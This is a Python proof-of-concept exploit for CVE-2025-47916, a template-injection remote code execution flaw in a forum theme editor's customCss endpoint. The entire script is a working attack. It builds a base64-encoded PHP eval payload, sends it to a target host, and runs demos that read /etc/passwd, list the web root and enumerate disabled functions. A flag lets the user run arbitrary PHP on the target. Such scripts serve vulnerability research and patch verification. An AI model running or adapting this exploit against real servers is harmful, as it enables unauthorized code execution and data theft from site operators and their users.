#!/usr/bin/env python3
"""
CVE-2025-47916 — PHP Eval Payload, Metasploit-style (Vector 2)
Exploit Intelligence Platform | https://exploit-intel.com | @exploit_intel

Uses the {expression="die(eval(base64_decode('PHP_CODE')))"} payload to execute
arbitrary PHP code through the template injection. Same technique as the Metasploit
module (invision_customcss_rce.rb).

Demonstrates: file reads, PHP info disclosure, directory listing, config enumeration.

Usage:
    python3 poc_vector2.py <target_host> [port]
    python3 poc_vector2.py <target_host> [port] --php-code "echo php_uname();"
"""

import sys
import base64
import urllib.request
import urllib.parse
import urllib.error
import argparse


OUTPUT_MARKER = "________"


def build_eval_payload(php_code):
    """
    Build a PHP eval()-based SSTI payload.

    Unlike the primary PoC which uses system() for OS commands, this uses:
        {expression="die('________'.eval(base64_decode('PHP_CODE_B64')))"}

    This compiles to:
        <?php echo die('________'.eval(base64_decode('PHP_CODE_B64'))); ?>

    The eval() executes arbitrary PHP code. The die() ensures the output
    is returned in the HTTP response with the marker for extraction.

    NOTE: eval() returns the value of the last expression in the code,
    so for clean output the PHP code should echo/print its output and
    the die() will capture the marker.
    """
    code_b64 = base64.b64encode(php_code.encode()).decode()
    payload = '{expression="die(\'' + OUTPUT_MARKER + '\'.eval(base64_decode(\'' + code_b64 + '\')))"}'
    return payload


def send_exploit(target_host, target_port, payload):
    """Send the exploit POST request to the vulnerable customCss endpoint."""
    url = f"http://{target_host}:{target_port}/index.php"

    params = {
        "app": "core",
        "module": "system",
        "controller": "themeeditor",
        "do": "customCss",
        "content": payload,
    }

    data = urllib.parse.urlencode(params).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        method="POST",
    )

    try:
        resp = urllib.request.urlopen(req, timeout=30)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None, None


def extract_output(response_body):
    """Extract output from response by splitting on marker."""
    if OUTPUT_MARKER in response_body:
        return response_body.split(OUTPUT_MARKER)[0].strip()
    return None


def exploit(target_host, target_port, php_code=None):
    """
    Demonstrate PHP eval() execution through SSTI.

    Runs a series of PHP payloads to demonstrate different capabilities
    of the eval()-based exploitation primitive.
    """
    print(f"[*] CVE-2025-47916: PHP Eval Payload Variant (Metasploit-style)")
    print(f"[*] Target: http://{target_host}:{target_port}/")
    print()

    if php_code:
        # Execute user-specified PHP code
        print(f"[*] Executing custom PHP code...")
        payload = build_eval_payload(php_code)
        status, body = send_exploit(target_host, target_port, payload)

        if status is None:
            print("[-] Failed to connect")
            return False

        output = extract_output(body)
        if output is not None:
            print(f"[+] PHP eval() execution successful!")
            print()
            print("--- Output ---")
            print(output)
            print("--------------")
            return True
        else:
            print(f"[-] Exploit failed (HTTP {status})")
            return False

    # ── Demo 1: PHP information disclosure ──────────────────────────────
    print("[*] Demo 1: PHP environment information (php_uname + phpversion)")
    php_info_code = 'echo "OS: " . php_uname() . "\\n"; echo "PHP: " . phpversion() . "\\n"; echo "SAPI: " . php_sapi_name() . "\\n"; echo "User: " . get_current_user() . "\\n";'
    payload = build_eval_payload(php_info_code)
    status, body = send_exploit(target_host, target_port, payload)
    output = extract_output(body)

    if output is not None:
        print(f"[+] PHP eval() succeeded!")
        print(output)
    else:
        print(f"[-] Demo 1 failed (HTTP {status})")
        if status == 403:
            print("[-] Target appears to be patched")
            return False
    print()

    # ── Demo 2: File read via PHP functions ─────────────────────────────
    print("[*] Demo 2: Reading /etc/passwd via file_get_contents()")
    file_read_code = 'echo file_get_contents("/etc/passwd");'
    payload = build_eval_payload(file_read_code)
    status, body = send_exploit(target_host, target_port, payload)
    output = extract_output(body)

    if output is not None:
        # Show first 5 lines to demonstrate file read
        lines = output.strip().split("\n")
        print(f"[+] File read successful! ({len(lines)} lines)")
        for line in lines[:5]:
            print(f"    {line}")
        if len(lines) > 5:
            print(f"    ... ({len(lines) - 5} more lines)")
    else:
        print(f"[-] Demo 2 failed")
    print()

    # ── Demo 3: Directory listing via PHP functions ─────────────────────
    print("[*] Demo 3: Listing web root via scandir()")
    dir_list_code = 'echo implode("\\n", scandir("/var/www/html/"));'
    payload = build_eval_payload(dir_list_code)
    status, body = send_exploit(target_host, target_port, payload)
    output = extract_output(body)

    if output is not None:
        print(f"[+] Directory listing successful!")
        for item in output.strip().split("\n"):
            print(f"    {item}")
    else:
        print(f"[-] Demo 3 failed")
    print()

    # ── Demo 4: Disabled functions check ────────────────────────────────
    print("[*] Demo 4: Checking PHP disable_functions")
    disable_check_code = '$df = ini_get("disable_functions"); echo $df ? "Disabled: " . $df : "No functions disabled";'
    payload = build_eval_payload(disable_check_code)
    status, body = send_exploit(target_host, target_port, payload)
    output = extract_output(body)

    if output is not None:
        print(f"[+] {output}")
    else:
        print(f"[-] Demo 4 failed")
    print()

    print("[+] PHP eval() exploitation CONFIRMED — arbitrary PHP execution achieved")
    print("[+] This demonstrates the Metasploit-style payload vector (eval vs system)")
    return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-47916 Vector 2: PHP Eval Payload (Metasploit-style)"
    )
    parser.add_argument("target", help="Target host (IP or hostname)")
    parser.add_argument("port", nargs="?", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--php-code", help="Custom PHP code to execute")

    args = parser.parse_args()

    success = exploit(args.target, args.port, args.php_code)
    sys.exit(0 if success else 1)
